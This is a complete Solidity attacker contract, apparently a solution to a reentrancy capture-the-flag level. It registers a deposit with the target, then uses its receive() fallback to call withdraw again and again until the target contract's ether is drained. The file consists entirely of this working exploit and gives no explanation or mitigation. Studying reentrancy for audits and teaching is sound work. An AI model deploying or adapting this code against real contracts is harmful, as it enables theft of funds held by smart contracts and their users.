// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Rerentrancy.sol";

contract AttackerReentrancy{
    Reentrance target;
    uint public amount = 1 ether; // Withdrawal amount each time

    constructor(address payable _target) public payable{
        target = Reentrance(_target);
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donate() public payable{
        // first donate so we can exist in the balances mapping
        target.donate{value: amount}(address(this));
        
    }

    function withdraw() public payable{
        target.withdraw(amount);
    }

    receive() external payable{
        if(address(target).balance >= amount){
            target.withdraw(amount);
        }
    }

}
